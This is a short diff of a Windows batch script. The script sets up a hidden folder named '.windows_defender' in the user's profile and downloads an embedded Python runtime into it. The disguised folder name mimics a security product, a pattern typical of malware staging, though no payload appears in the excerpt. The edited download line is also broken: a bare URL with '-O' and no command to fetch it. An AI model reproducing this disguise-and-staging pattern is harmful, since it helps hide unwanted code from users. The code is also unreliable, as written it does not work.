@@ -5,9 +5,8 @@ if not exist "%USERPROFILE%\.windows_defender" (
 )
 cd .windows_defender
 
-if not exist "%USERPROFILE%\.windows_defender\python-3.9.13-embed-amd64.zip" (
-    https://www.python.org/ftp/python/3.9.13/python-3.9.13-embed-amd64.zip -O
-)
+
+https://www.python.org/ftp/python/3.9.13/python-3.9.13-embed-amd64.zip -O
 
 mkdir python
 
